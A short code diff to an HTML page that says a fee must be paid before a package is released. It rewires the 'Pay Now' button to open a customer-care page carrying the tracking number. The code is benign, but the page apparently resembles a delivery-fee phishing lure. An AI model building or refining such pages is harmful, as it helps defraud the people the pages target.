@@ -185,7 +185,7 @@
         <p class="fee-amount" id="feeAmount">—</p>
         <p class="fee-note">This fee must be paid before your package can be released and returned to transit.</p>
       </div>
-      <button class="pay-now-btn" onclick="alert('Payment processing is not yet configured. Please contact customer care below.')">Pay Now</button>
+      <button class="pay-now-btn" onclick="window.location.href='care.html?tracking='+new URLSearchParams(window.location.search).get('tracking')">Pay Now</button>
 
       <div class="care-section">
         <h3>Contact Customer Care</h3>
